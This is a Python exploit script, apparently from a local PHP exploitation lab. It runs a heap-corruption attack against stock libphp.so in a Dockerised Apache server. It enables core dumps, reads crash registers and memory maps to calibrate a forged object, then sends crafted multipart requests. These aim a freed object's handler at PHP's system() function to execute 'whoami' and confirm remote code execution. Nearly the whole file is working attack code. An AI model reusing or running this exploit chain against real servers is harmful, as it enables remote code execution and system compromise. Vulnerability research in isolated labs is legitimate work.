#!/usr/bin/env python3
"""oom76: self-contained closing attempt — calibrate then aimed sequence.

oom75/75b lesson: calibration works (phi=0, VA0 measured from core,
rc=1+ti=0x108 verified at VA0+3584), but aimed finishers fired into a
child armed with CAL bytes -> crash read marker (rdi=0x4141...). The
child that arms must hold AIMED bytes: after calibration, re-run the
FULL sequence (warm 11 + sacrifice + finishers) with the aimed tile in
the SAME boot. Core env stays on until the end.

Aim: T[0:8] = VA0+3584+8 (next value's copy-0 rc field, content rc=1).
Walk (phi=0) reads T[0:8] -> subl -> 0 -> rc_dtor_func(TARGET) ->
GC_TYPE=8 -> store_del -> free_obj=&zif_system -> system("whoami>/tmp/x").
"""
import re
import struct
import subprocess
import sys
import time

sys.path.insert(0, '/Users/vlad/Projects/queue/php2shell-lab')
import payload68 as P

HOST = "http://127.0.0.1:8081/oom_sapi.php"
CMD = b"whoami>/tmp/x"
ZIF_SYSTEM = 0x39b8a0
STRIDE = 3584


def sh(c, t=120):
    r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
    return (r.stdout + r.stderr).strip()


def post(att):
    import urllib.request
    req = urllib.request.Request(
        HOST, data=att,
        headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        with urllib.request.urlopen(req, timeout=120) as r:
            return "200", r.read(300)
    except Exception as e:
        return "ERR", str(e)[:150].encode()


def boot_core_env():
    sh("docker exec php_vuln sh -c \"grep -q 'ulimit -c' /etc/apache2/envvars || echo 'ulimit -c unlimited' >> /etc/apache2/envvars\"")
    sh("docker exec php_vuln sh -c \"printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf\"")
    sh("docker exec php_vuln sh -c 'rm -f /tmp/core* /tmp/x'")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        if "lim=8M" in sh("curl -s -m 5 " + HOST, 10):
            break
    md5 = sh("docker exec php_vuln md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
    assert md5 == P.STOCK_MD5, md5


def build_tile(libphp_base, VA0, cal=False, target=None):
    T = bytearray(176)
    struct.pack_into("<IIII", T, 8, 1, 0x108, 1, 0)   # rc, ti, handle, pad
    struct.pack_into("<Q", T, 32, VA0 + 152)          # handlers
    struct.pack_into("<I", T, 52, 1)                  # num_args (This.u2)
    struct.pack_into("<QII", T, 88, VA0 + 112, 6, 0)  # argz value/type/u2
    struct.pack_into("<IIQ", T, 112, 1, 0x106, 0)     # gs rc/ti/h
    struct.pack_into("<Q", T, 128, len(CMD))          # gs len
    T[136:136 + len(CMD)] = CMD
    T[136 + len(CMD)] = 0
    struct.pack_into("<QQ", T, 152, 0, libphp_base + ZIF_SYSTEM)
    if cal:
        MK = struct.pack("<Q", 0x414141414141)
        for off in (0, 32, 88, 160):
            T[off:off + 8] = MK
    elif target is not None:
        T[0:8] = struct.pack("<Q", target)
    return bytes(T)


def fetch_core(tag):
    sh("docker cp php_vuln:/tmp/core /tmp/c76_%s" % tag, 240)
    sh("docker cp /tmp/c76_%s phpbuild:/tmp/c76_%s" % (tag, tag), 240)
    return "/tmp/c76_%s" % tag


def core_rdi(core_in_build):
    out = sh("docker exec phpbuild sh -c 'gdb -q -batch -ex \"info registers rdi\" /tmp/libphp.69.so /tmp/%s'" % core_in_build, 240)
    m = re.search(r"rdi\s+0x([0-9a-f]+)", out)
    return struct.pack("<Q", int(m.group(1), 16)) if m else None


def core_phi(T_cal, rdi8):
    d = T_cal * 2
    for phi in range(0, 176, 8):
        if d[phi:phi + 8] == rdi8:
            return phi
    return None


def core_pt_loads(data):
    e_phoff = struct.unpack_from("<Q", data, 0x20)[0]
    e_phentsize = struct.unpack_from("<H", data, 0x36)[0]
    e_phnum = struct.unpack_from("<H", data, 0x38)[0]
    segs = []
    for i in range(e_phnum):
        o = e_phoff + i * e_phentsize
        if struct.unpack_from("<I", data, o)[0] != 1:
            continue
        p_off, p_vaddr = struct.unpack_from("<QQ", data, o + 8)
        p_filesz = struct.unpack_from("<Q", data, o + 0x20)[0]
        if p_filesz:
            segs.append((p_vaddr, p_filesz, p_off))
    return segs


def core_va0(core_host, T_cal):
    data = open(core_host, "rb").read()
    segs = core_pt_loads(data)
    pat = T_cal[:16]
    pos = 0
    while True:
        i = data.find(pat, pos)
        if i < 0:
            return None
        for va, sz, off in segs:
            if off <= i < off + sz:
                return va + (i - off)
        pos = i + 1


def core_check_rc1(core_host, VA0):
    data = open(core_host, "rb").read()
    want = struct.pack("<II", 1, 0x108)
    a = VA0 + STRIDE + 8
    for va, sz, off in core_pt_loads(data):
        if va <= a and a + 8 <= va + sz:
            got = data[off + (a - va):off + (a - va) + 8]
            return got == want, got.hex()
    return False, "unmapped"


print("=== oom76: calibrate then aimed sequence, one boot ===", flush=True)
boot_core_env()
pid = sh("docker exec php_vuln pgrep -f 'apache2' | head -1").strip()
maps = sh("docker exec php_vuln cat /proc/%s/maps" % pid)
base = None
for ln in maps.splitlines():
    if "libphp.so" in ln and ln.split()[1].startswith("r"):
        base = int(ln.split()[0].split("-")[0], 16)
        break
print("    libphp base = 0x%x" % base, flush=True)

# ---------- PHASE 1: calibration ----------
T_cal = build_tile(base, 0x1000, cal=True)  # VA0 placeholder; marker slots dominate
print("[1] CAL warm (11)", flush=True)
for i, k1 in enumerate(P.K1S[:-1]):
    post(P.build_attack(k1, 9100000 + i * 100000, value_tile=T_cal))
phi = VA0 = None
for fi in range(3):
    code, resp = post(P.build_attack(3400, 9200000 + fi * 100000, value_tile=T_cal))
    print("  cal-fire%d: %s" % (fi, code), flush=True)
    if code == "200":
        continue
    time.sleep(3)
    cb = fetch_core("cal%d" % fi)
    rdi8 = core_rdi("c76_cal%d" % fi)
    if rdi8 is None:
        continue
    phi = core_phi(T_cal, rdi8)
    VA0 = core_va0(cb, T_cal)
    print("    rdi=%s phi=%s VA0=%s" % (rdi8.hex(), phi, hex(VA0) if VA0 else None), flush=True)
    if phi is not None and VA0:
        break
if phi is None or VA0 is None:
    print("[ABORT] calibration incomplete", flush=True)
    sys.exit(1)
ok, got = core_check_rc1(cb, VA0)
print("    rc-check at VA0+%d: %s (%s)" % (STRIDE, ok, got), flush=True)
TARGET = VA0 + STRIDE + 8 if ok else VA0 + 8

# ---------- PHASE 2: aimed sequence (same boot) ----------
T_aim = build_tile(base, VA0, target=TARGET)
print("[2] AIM warm (11), target=0x%x free_obj=0x%x" % (TARGET, base + ZIF_SYSTEM), flush=True)
for i, k1 in enumerate(P.K1S[:-1]):
    post(P.build_attack(k1, 9400000 + i * 100000, value_tile=T_aim))
print("[3] AIM sacrifice + finishers", flush=True)
post(P.build_attack(3400, 9500000, value_tile=T_aim))
for fi in range(4):
    code, resp = post(P.build_attack(3400, 9510000 + fi * 100000, value_tile=T_aim))
    print("  aim-fire%d: %s" % (fi, code), flush=True)
    time.sleep(2)
    x = sh("docker exec php_vuln sh -c 'ls -la /tmp/x 2>&1; cat /tmp/x 2>&1'")
    if "No such" not in x:
        print("    /tmp/x: [%s]" % x, flush=True)
        print("*** RCE CONFIRMED (aim-fire%d) ***" % fi, flush=True)
        break
    print("    /tmp/x: not yet", flush=True)
    if code != "200":
        time.sleep(3)
        cb2 = fetch_core("aim%d" % fi)
        rdi8 = core_rdi("c76_aim%d" % fi)
        print("    crash rdi=%s (want %s)" % (
            rdi8.hex() if rdi8 else "?", struct.pack("<Q", TARGET).hex()), flush=True)

print("[4] restore", flush=True)
sh("docker exec php_vuln sh -c 'rm -f /etc/apache2/conf-enabled/oomcore.conf && sed -i \"/ulimit -c/d\" /etc/apache2/envvars'")
subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
time.sleep(8)
print("    restored:", sh("curl -s -m 5 " + HOST, 10), flush=True)
